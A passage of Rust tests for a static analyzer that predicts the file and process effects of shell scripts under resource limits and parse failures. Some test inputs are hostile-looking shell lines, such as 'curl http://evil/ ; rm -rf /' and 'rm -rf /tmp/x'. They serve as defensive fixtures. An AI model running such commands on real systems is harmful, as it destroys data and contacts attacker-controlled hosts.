    for index in 0..1000 {
        source.push_str(&format!("v{index}=$(sub{index} -x)\n"));
    }
    for index in 0..1000 {
        source.push_str(&format!("V{index}=value{index}\n"));
    }
    source.push_str("wrapper() {\n  echo");
    for index in 0..1000 {
        source.push_str(&format!(" \"$V{index}\""));
    }
    source.push_str("\n  \"$1\" -x\n}\n");
    for index in 0..8000 {
        source.push_str(&format!("wrapper tool{index}\n"));
    }
    source.push_str("late_tool --flag");

    let plan = Engine::with_limits(unbounded_steps())
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"tool0\"")),
        "saturated wrapper lost its first concrete head: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "repeated wrapper calls starved later source: {resources:?}"
    );
    let recovered_wrapper_heads = resources
        .iter()
        .filter(|resource| resource.contains("\"tool"))
        .count();
    assert!(
        recovered_wrapper_heads <= 17,
        "large keys admitted unbounded wrapper heads: {recovered_wrapper_heads}"
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn saturated_wide_argv_calls_charge_function_key_work() {
    let mut source = "one; two\nargs=(".to_string();
    for index in 0..1000 {
        source.push_str(&format!(" arg{index}"));
    }
    source.push_str(")\nwrapper() { \"$1\" -x; }\n");
    for index in 0..8000 {
        source.push_str(&format!("wrapper tool{index} \"${{args[@]}}\"\n"));
    }
    source.push_str("late_tool --flag");

    let mut limits = unbounded_steps();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"tool0\"")),
        "saturated wrapper lost its first concrete head: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "wide wrapper calls starved later source: {resources:?}"
    );
    let recovered_wrapper_heads = resources
        .iter()
        .filter(|resource| resource.contains("\"tool"))
        .count();
    assert!(
        recovered_wrapper_heads <= 17,
        "wide argv keys admitted unbounded wrapper heads: {recovered_wrapper_heads}"
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn saturated_pipeline_function_calls_filter_child_environments() {
    let mut source = "one; two\n".to_string();
    for index in 0..20_000 {
        source.push_str(&format!("V{index}=value{index}\n"));
    }
    for index in 0..20_000 {
        source.push_str(&format!("unused{index}() {{ :; }}\n"));
    }
    source.push_str("CMD=curl\nby_var() { out=$(\"$CMD\" -x); }\nby_var | :\n");
    source.push_str("helper() { \"$1\" -x; }\nwrapper() { helper \"$1\"; }\n");
    for index in 0..8000 {
        source.push_str(&format!("wrapper tool{index} | :\n"));
    }
    source.push_str("late_tool --flag");

    let mut limits = unbounded_steps();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"curl\"")),
        "filtered child environment lost a referenced binding: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"tool0\"")),
        "saturated pipeline wrapper lost its first concrete head: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "pipeline wrapper calls starved later source: {resources:?}"
    );
    let recovered_wrapper_heads = resources
        .iter()
        .filter(|resource| resource.contains("\"tool"))
        .count();
    assert!(
        recovered_wrapper_heads >= 1024,
        "child environment clone bound collapsed wrapper recall: {recovered_wrapper_heads}"
    );
    assert!(
        recovered_wrapper_heads <= 2048,
        "child environment clones admitted unbounded wrapper heads: {recovered_wrapper_heads}"
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn saturated_function_inputs_preserve_field_splitting_ifs() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 0);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "sh -c true; IFS=:; x='a:b c'; f(){ rm $x; }; f | cat".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process {
                        executable,
                        argv,
                        ..
                    }
                } if executable == "rm"
                    && matches!(argv.as_slice(), [ResourceExpr::Literal { value }]
                        if value == "a:b c")
            )
    }));
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "unsupported_shell_syntax"
            && boundary.class == BoundaryClass::Unsupported
    }));
}

#[test]
fn saturated_function_memo_separates_script_set_ifs() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 0);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "sh -c true; x='a b'; f(){ rm $x; }; f; IFS=:; f".to_string(),
            cwd: None,
            context: HostContext {
                env: [("IFS".to_string(), ":".to_string())].into_iter().collect(),
                ..Default::default()
            },
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "process.exec"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process {
                        executable,
                        argv,
                        ..
                    }
                } if executable == "rm"
                    && matches!(argv.as_slice(),
                        [ResourceExpr::Literal { value: first }, ResourceExpr::Literal { value: second }]
                        if first == "a" && second == "b")
            )
    }));
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "unsupported_shell_syntax"
            && boundary.class == BoundaryClass::Unsupported
    }));
}

#[test]
fn saturated_repeated_call_sites_charge_literal_callee_traversal() {
    let mut source = "one; two\nwrapper() { ".to_string();
    for index in 0..1000 {
        source.push_str(&format!("callee{index} | "));
    }
    source.push_str("sink\n  \"$1\" -x\n}\n");
    for index in 0..8000 {
        source.push_str(&format!("wrapper tool{index}\n"));
    }
    source.push_str("late_tool --flag");

    let mut limits = unbounded_steps();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"tool0\"")),
        "saturated wrapper lost its first concrete head: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "repeated wrapper calls starved later source: {resources:?}"
    );
    let recovered_wrapper_heads = resources
        .iter()
        .filter(|resource| resource.contains("\"tool"))
        .count();
    assert!(
        recovered_wrapper_heads <= 17,
        "literal callee walks admitted unbounded wrapper heads: {recovered_wrapper_heads}"
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn saturated_repeated_substitutions_charge_literal_callee_traversal() {
    let mut source = "one; two\n".to_string();
    for index in 0..1000 {
        source.push_str(&format!("callee{index}() {{ value{index}=x; }}\n"));
    }
    source.push_str("wrapper() {\n");
    for index in 0..1000 {
        source.push_str(&format!("  callee{index}\n"));
    }
    source.push_str("}\n");
    for index in 0..1000 {
        source.push_str(&format!("out=$(tool{index} -x; wrapper)\n"));
    }
    source.push_str("late_tool --flag");

    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"tool0\"")),
        "saturated substitution lost its first concrete head: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "repeated substitutions starved later source: {resources:?}"
    );
    let recovered_substitution_heads = resources
        .iter()
        .filter(|resource| resource.contains("\"tool"))
        .count();
    assert!(
        recovered_substitution_heads <= 17,
        "literal callee walks admitted unbounded substitutions: {recovered_substitution_heads}"
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn saturated_repeated_substitutions_charge_body_parsing() {
    let argument = "a".repeat(1000);
    let mut source = format!("one; two\nwrapper() {{ out=$(\"$1\" {argument}); }}\n");
    for index in 0..8000 {
        source.push_str(&format!("wrapper tool{index}\n"));
    }
    source.push_str("late_tool --flag");

    let mut limits = unbounded_steps();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"tool0\"")),
        "saturated substitution lost its first concrete head: {resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "repeated substitutions starved later source: {resources:?}"
    );
    let recovered_substitution_heads = resources
        .iter()
        .filter(|resource| resource.contains("\"tool"))
        .count();
    assert!(
        recovered_substitution_heads <= 17,
        "substitution body parsing admitted unbounded heads: {recovered_substitution_heads}"
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn repeated_nested_function_definitions_reuse_referenced_inputs() {
    let mut source = "wrapper() { nested() {\n".to_string();
    for _ in 0..4000 {
        source.push_str("  /bin/tool0 x\n");
    }
    source.push_str("}; }\n");
    for index in 0..8000 {
        source.push_str(&format!("wrapper arg{index}\n"));
    }
    source.push_str("late_tool --flag");

    let plan = Engine::with_limits(unbounded_steps())
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        exec_resources(&plan)
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "repeated nested definitions starved later source: {:?}",
        exec_resources(&plan)
    );
    assert!(plan.effects.len() < default_limits()["max_effects"] as usize);
}

#[test]
fn saturated_dynamic_function_fanout_keeps_one_symbolic_head() {
    let mut source = "f8() { \"$TOOL\" \"$1\"; }\n".to_string();
    for level in (1..8).rev() {
        let next = level + 1;
        source.push_str(&format!(
            "f{level}() {{ f{next} \"$1-a\"; f{next} \"$1-b\"; f{next} \"$1-c\"; f{next} \"$1-d\"; }}\n"
        ));
    }
    source.push_str("one; two; f1 seed; late_tool --flag");

    let mut limits = unbounded_steps();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source,
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let unresolved: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| {
            effect.operation.0 == "process.exec"
                && matches!(effect.resource, ResourceExpr::Unresolved { .. })
        })
        .collect();
    assert_eq!(unresolved.len(), 1, "got {unresolved:?}");
    assert!(
        exec_resources(&plan)
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "dynamic placeholders starved a later literal: {:?}",
        exec_resources(&plan)
    );
    assert!(!plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "limit_saturated"
            && boundary.limit.as_deref() == Some("max_effects")
    }));
}

#[test]
fn saturated_case_walk_keeps_late_heads_and_marks_the_region() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 1);
    let cases = "case \"$x\" in a) case \"$y\" in c) curl https://h/f ;; d) tar -xf archive ;; esac ;; b) wget https://h/g ;; esac\n".repeat(128);
    let source = format!("one; two\n{cases}late_tool --flag");
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.clone(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        exec_resources(&plan)
            .iter()
            .any(|resource| resource.contains("\"late_tool\"")),
        "late literal command was lost after saturation: {:?}",
        exec_resources(&plan)
    );
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "branch_starved"
            && boundary.provenance.iter().any(|reference| {
                matches!(
                    plan.provenance[reference.0 as usize].kind,
                    effinterp_proto::ProvenanceKind::SourceSpan { start, end }
                        if source[start as usize..end as usize].contains("late_tool")
                )
            })
    }));
    assert_eq!(
        plan.boundaries
            .iter()
            .filter(|boundary| boundary.reason.as_str() == "branch_starved")
            .count(),
        1
    );
}

#[test]
fn function_depth_saturation_keeps_distinct_redirection_targets() {
    let mut limits = default_limits();
    limits.insert("max_shell_function_depth".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "inner() { :; }\nouter() { inner; }\nwrite() { echo x > \"$1\"; }\nouter\nwrite /tmp/a\nwrite /tmp/b".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    for path in ["/tmp/a", "/tmp/b"] {
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.write"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path: actual }
                        } if actual == path
                    )
            }),
            "redirection target {path} was lost: {:?}",
            plan.effects
        );
    }
}

#[test]
fn saturated_substitution_keeps_a_literal_head_and_site_boundary() {
    let mut limits = default_limits();
    limits.insert("max_execution_fanout".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "one; two; three; out=$(curl -sS https://example.com/f); other=$(wget https://example.com/g)".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        exec_resources(&plan).iter().any(|r| r.contains("\"curl\"")),
        "substitution command was silently dropped: {:?}",
        exec_resources(&plan)
    );
    assert!(
        exec_resources(&plan).iter().any(|r| r.contains("\"wget\"")),
        "later substitution command was silently dropped: {:?}",
        exec_resources(&plan)
    );
    assert_eq!(
        plan.boundaries
            .iter()
            .filter(|boundary| boundary.limit.as_deref() == Some("max_execution_fanout"))
            .count(),
        2
    );
    assert!(plan.execution_graph.nodes.iter().any(|node| {
        matches!(
            &node.subject,
            Subject::Shell { source, .. } if source.contains("curl -sS")
        ) && node.boundary.is_some()
    }));
}

#[test]
fn top_level_all_args_stays_symbolic() {
    // Outside a function call the positional parameters are unknown.
    let plan = shell("\"$@\"", None);
    assert!(
        plan.effects.iter().any(|e| e.operation.0 == "process.exec"
            && matches!(e.resource, ResourceExpr::Unresolved { .. })),
        "got {:?}",
        ops(&plan)
    );
}

#[test]
fn array_splice_resolves_through_sudo_wrapper() {
    // Homebrew's execute_sudo(): args captures "$@", is conditionally
    // prefixed, and runs under sudo; both candidates resolve to tee.
    let plan = shell(
        "execute() { \"$@\"; }\nexecute_sudo() { local -a args=(\"$@\"); if [[ -n \"${SUDO_ASKPASS-}\" ]]; then args=(\"-A\" \"${args[@]}\"); fi; execute /usr/bin/sudo \"${args[@]}\"; }\necho x | execute_sudo tee /etc/paths.d/homebrew",
        None,
    );
    assert!(
        exec_resources(&plan).iter().any(|r| r.contains("tee")),
        "got {:?}",
        exec_resources(&plan)
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.write"
                && format!("{:?}", e.resource).contains("/etc/paths.d/homebrew"))
    );
}

#[test]
fn ambiguous_array_stays_symbolic() {
    // Four possible values exceed the candidate cap: no argv is invented.
    let plan = shell(
        "a=(x1); if t; then a=(x2); fi; if u; then a=(x3); fi; if v; then a=(x4); fi; \"${a[@]}\"",
        None,
    );
    for r in exec_resources(&plan) {
        assert!(
            !r.contains("x1") && !r.contains("x2") && !r.contains("x3") && !r.contains("x4"),
            "over-wide array must not resolve, got {r:?}"
        );
    }
}

#[test]
fn shift_moves_positional_parameters() {
    // Homebrew's retry(): drop the count, run the rest.
    let plan = shell(
        "retry() { local tries=\"$1\"; shift; \"$@\"; }\nretry 5 ln -s a b",
        None,
    );
    let execs = exec_resources(&plan);
    assert!(execs.iter().any(|r| r.contains("\"ln\"")), "got {execs:?}");
    assert!(!execs.iter().any(|r| r.contains('5')), "got {execs:?}");
}

fn write_resources(plan: &Plan) -> Vec<String> {
    plan.effects
        .iter()
        .filter(|e| e.operation.0 == "filesystem.write")
        .map(|e| format!("{:?}", e.resource))
        .collect()
}

#[test]
fn inline_shell_arguments_become_positional_parameters() {
    // `sh -c CODE ARG0 ARG1 ...` binds $0=ARG0, $1=ARG1, ...
    let plan = shell("bash -c 'printf x > \"$0\"' /home/test/.nah/config", None);
    let writes = write_resources(&plan);
    assert!(
        writes.iter().any(|r| r.contains("/home/test/.nah/config")),
        "got {writes:?}"
    );

    let plan = shell(
        "bash -c 'printf x > \"$1\"' shell /home/test/.nah/config",
        None,
    );
    let writes = write_resources(&plan);
    assert!(
        writes.iter().any(|r| r.contains("/home/test/.nah/config")),
        "got {writes:?}"
    );

    // A symbolic argument stays symbolic.
    let plan = shell("bash -c 'printf x > \"$1\"' shell \"$TARGET\"", None);
    let writes = write_resources(&plan);
    assert!(
        writes.iter().all(|r| !r.contains("FsPath")),
        "got {writes:?}"
    );
}

#[test]
fn set_replaces_positional_parameters() {
    let plan = shell("set -- /home/test/.nah/config; printf x > \"$1\"", None);
    let writes = write_resources(&plan);
    assert!(
        writes.iter().any(|r| r.contains("/home/test/.nah/config")),
        "got {writes:?}"
    );

    let plan = shell("set -e /home/test/.nah/config; printf x > \"$1\"", None);
    let writes = write_resources(&plan);
    assert!(
        writes.iter().any(|r| r.contains("/home/test/.nah/config")),
        "got {writes:?}"
    );

    // Options only, including `-o OPTION`, leave the parameters alone.
    let plan = shell("set -eo pipefail; printf x > \"$1\"", None);
    let writes = write_resources(&plan);
    assert!(
        writes.iter().all(|r| !r.contains("pipefail")),
        "got {writes:?}"
    );
}

/// Repeated walks of the same code (function calls here) reuse structurally
/// identical provenance nodes instead of minting duplicates — duplicates
/// saturate max_provenance_nodes on large scripts, degrading every later
/// effect's span to the empty 0..0 sentinel.
#[test]
fn repeated_function_calls_share_provenance_nodes() {
    let src = "wipe() { rm -rf /tmp/x; }\nwipe\nwipe\nwipe\n";
    let plan = shell(src, Some("/work"));
    let mut seen = std::collections::HashSet::new();
    for node in &plan.provenance {
        assert!(
            seen.insert(node.clone()),
            "duplicate provenance node: {node:?}"
        );
    }
    // The recorded span covers the body command, not an empty sentinel.
    let spans: Vec<(u32, u32)> = plan
        .provenance
        .iter()
        .filter_map(|n| match n.kind {
            effinterp_proto::ProvenanceKind::SourceSpan { start, end } => Some((start, end)),
            _ => None,
        })
        .collect();
    assert!(
        spans
            .iter()
            .any(|(s, e)| &src[*s as usize..*e as usize] == "rm -rf /tmp/x"),
        "no span covers the rm command: {spans:?}"
    );
    assert!(!spans.contains(&(0, 0)));
}

#[test]
fn saturated_substitution_nesting_is_execution_depth_bounded() {
    // Retaining command heads after saturation still recurses into each
    // substitution body; without the depth bound this overflows the stack.
    let mut inner = "cmd0".to_string();
    for level in 1..4000 {
        inner = format!("cmd{level} $({inner})");
    }
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: format!("one; two\nx=$({inner})"),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        plan.effects.len() < default_limits()["max_effects"] as usize,
        "saturated substitution nesting filled the effect budget"
    );
}

#[test]
fn saturated_function_memo_separates_redefinitions() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "one; two\nf() { aaa -x; }\nf\nf() { bbb -x; }\nf\nf() { ccc -x; }\nf"
                .to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    for executable in ["aaa", "bbb", "ccc"] {
        assert!(
            resources
                .iter()
                .any(|resource| resource.contains(&format!("\"{executable}\""))),
            "redefined function body was memoized away: {resources:?}"
        );
    }
}

#[test]
fn saturated_function_memo_separates_variable_carried_heads() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "run() { command \"$CMD\" -x; }\none; two\nCMD=aaa\nrun\nCMD=bbb\nrun\nCMD=ccc\nrun\nCMD=ddd\nrun".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    for executable in ["aaa", "bbb", "ccc", "ddd"] {
        assert!(
            resources
                .iter()
                .any(|resource| resource.contains(&format!("\"{executable}\""))),
            "variable-carried head was treated as an already-walked input: {resources:?}"
        );
    }
}

#[test]
fn saturated_function_memo_separates_substitution_carried_heads() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 1);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "run() { out=$(\"$CMD\" -x); }\none; two\nCMD=aaa\nrun\nCMD=bbb\nrun\nCMD=ccc\nrun\nCMD=ddd\nrun".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    for executable in ["aaa", "bbb", "ccc", "ddd"] {
        assert!(
            resources
                .iter()
                .any(|resource| resource.contains(&format!("\"{executable}\""))),
            "substitution-carried head was treated as an already-walked input: {resources:?}"
        );
    }
}

#[test]
fn saturated_function_memo_tracks_variables_in_alternative_arms() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "run() { case x in x) command \"$CMD\" -x ;; esac; }\none; two\nCMD=aaa\nrun\nCMD=bbb\nrun\nCMD=ccc\nrun\nCMD=ddd\nrun".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    for executable in ["aaa", "bbb", "ccc", "ddd"] {
        assert!(
            resources
                .iter()
                .any(|resource| resource.contains(&format!("\"{executable}\""))),
            "alternative-arm variable was omitted from the function memo: {resources:?}"
        );
    }
}

#[test]
fn saturated_function_memo_tracks_late_callee_variables() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap().with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "outer() { helper; }\nhelper() { command \"$CMD\" -x; }\none; two\nCMD=aaa\nouter\nCMD=bbb\nouter\nCMD=ccc\nouter\nCMD=ddd\nouter".to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    let resources = exec_resources(&plan);
    for executable in ["aaa", "bbb", "ccc", "ddd"] {
        assert!(
            resources
                .iter()
                .any(|resource| resource.contains(&format!("\"{executable}\""))),
            "late callee variable was omitted from the function memo: {resources:?}"
        );
    }
}

#[test]
fn saturated_nested_substitution_keeps_referenced_binding() {
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "unused_a=a\nunused_b=b\nCMD=curl\none; two; three\nout=$(inner=$($CMD -x))"
                .to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        exec_resources(&plan)
            .iter()
            .any(|resource| resource.contains("\"curl\"")),
        "nested substitution lost its referenced binding: {:?}",
        exec_resources(&plan)
    );
}

#[test]
fn saturated_function_memo_keeps_dynamic_heads_symbolic() {
    // Paired negative: an input-determined head stays symbolic no matter how
    // many distinct variable values reach the same wrapper.
    let mut limits = default_limits();
    limits.insert("max_execution_nodes".to_string(), 2);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "run() { out=$(\"$CMD\" -x); }\none; two\nCMD=$(pick)\nrun\nCMD=$(pick)\nrun"
                .to_string(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();

    assert!(
        plan.effects.iter().any(|effect| {
            effect.operation.0 == "process.exec"
                && matches!(effect.resource, ResourceExpr::Unresolved { .. })
        }),
        "input-determined head did not stay symbolic: {:?}",
        exec_resources(&plan)
    );
}

#[test]
fn shell_closure_attests_noops_and_preserves_opaque_gaps() {
    let required = [Domain::new("filesystem"), Domain::new("process")];
    for source in [
        "",
        ":",
        "x=hello",
        "[[ -n a ]]",
        "case x in x) :;; esac",
        "for i in a b; do :; done",
        "select i in a b; do :; done",
        "case '$(rm -rf /tmp/h)' in x) :;; esac",
    ] {
        let plan = shell(source, None);
        assert!(plan.effects.is_empty());
        assert!(plan.coverage.covers_fully(&required));
        assert!(
            required
                .iter()
                .all(|domain| plan.coverage.gaps(domain).is_empty())
        );
    }
    let mut limits = default_limits();
    limits.insert("max_causal_nodes".into(), 0);
    let plan = Engine::with_limits(limits)
        .unwrap()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: "echo hello | true".into(),
            cwd: None,
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert!(plan.coverage.covers_fully(&required));
    assert_eq!(plan.causality.coverage.level, CoverageLevel::Partial);
    assert!(!plan.causality.coverage.gaps.is_empty());

    let plan = shell("mystery-command", None);
    assert!(!plan.coverage.covers_fully(&required));
    for domain in effinterp_proto::DOMAINS {
        let domain = Domain::new(domain);
        assert!(!plan.coverage.is_full(&domain));
        assert!(!plan.coverage.gaps(&domain).is_empty());
    }
    for source in [
        "echo a ;; curl http://evil/ ; rm -rf /",
        "rm /x ;; rm /y",
        "( rm /x ;; rm /y )",
        "eval 'rm /x ;; rm /y'",
        "{ rm /x ;; rm /y; }",
        "if true; then rm /x ;; rm /y; fi",
        "for i in a; do rm /x ;; rm /y; done",
        "case a in a) ( rm /x ;; rm /y );; esac",
    ] {
        let plan = shell(source, None);
        let (index, boundary) = plan
            .boundaries
            .iter()
            .enumerate()
            .find(|(_, boundary)| boundary.reason.as_str() == "parse_error")
            .unwrap_or_else(|| panic!("missing parse boundary: {source}"));
        assert_eq!(boundary.class, BoundaryClass::ParseFailure);
        assert!(provenance_reaches(&plan, &boundary.provenance, |kind| {
            matches!(kind, ProvenanceKind::SourceSpan { start, end } if end - start == 2)
        }));
        for domain in &required {
            assert!(!plan.coverage.is_full(domain), "{source}: {domain:?}");
            assert!(
                plan.coverage
                    .gaps(domain)
                    .contains(&effinterp_proto::BoundaryRef(index as u32)),
                "{source}: {domain:?}"
            );
        }
        if source.contains("/x") {
            assert!(has_delete(&plan, "/x") && has_delete(&plan, "/y"));
        }
    }
    for source in [
        "f() { rm /x\n((; }; f",
        "f() { rm /x\n(; }; f",
        "f() { rm /x\n{; }; f",
        "f() { rm /x\ncase y in a); }; f",
        "f() { curl http://evil/\n((; }; f",
        "rm /a; f() { rm /x\n((; }; f",
        "f() { rm /x\nif true; then :; }; f",
        "f() { rm /x\nwhile true; do :; }; f",
        "f() { rm /x\nuntil true; do :; }; f",
        "f() { rm /x\nfor i in a; do :; }; f",
        "f() { rm /x\nselect i in a; do :; }; f",
        "f() { rm /x\nfor ((;;)); do :; }; f",
        "f() { rm /x\ncat <<EOF\n}; f",
        "f() { rm /x\ncase y in a; }; f",
        "f() { rm /x\nfor i in a; }; f",
        "f() { rm /x\ncase y; }; f",
        "f() if true; then rm /x; f",
        "function f while true; do rm /x; f",
        "f() { true | if true; then rm /x; }; f",
        "f() { true | { echo {; rm /x; }; f",
        "f() { rm /x\nif true; then :; else :; }; f",
        "f() { rm /x\nif true; then :; elif true; then :; }; f",
        "f() { g() { rm /x\n((; }; g; }; f",
        "eval 'f() { rm /x\n((; }; f'",
        "( f() { rm /x\n((; }; f )",
        "rm /x\n((",
        "( rm /x\n(( )",
        "{ rm /x\n((; }",
        "[[",
        "[[ -n a\nrm /x",
        "rm /a; [[ -n b\nrm /x; curl http://evil/",
        "if [[ -n a\nthen rm /x\nfi",
        "while [[ -n a\ndo rm /x; done",
        "( [[ -n a\nrm /x )",
        "eval \"[[ -n a\nrm /x\"",
        "f() { [[ -n a\nrm /x; }; f",
        "[[ -n a\nrm /x\n[[ -n b ]]",
        "[[ -n a\ncurl http://evil/\n[[ -n b ]]",
        "if [[ -n $a\nthen rm /x\nfi\n[[ -n $b ]] && rm /y",
        "rm /a; [[ -n b\nrm /x\n[[ -n c ]]",
        "( [[ -n a\nrm /x\n[[ -n b ]] )",
        "f() { [[ -n a\nrm /x\n[[ -n b ]]; }; f",
        "eval \"[[ -n a\nrm /x\n[[ -n b ]]\"",
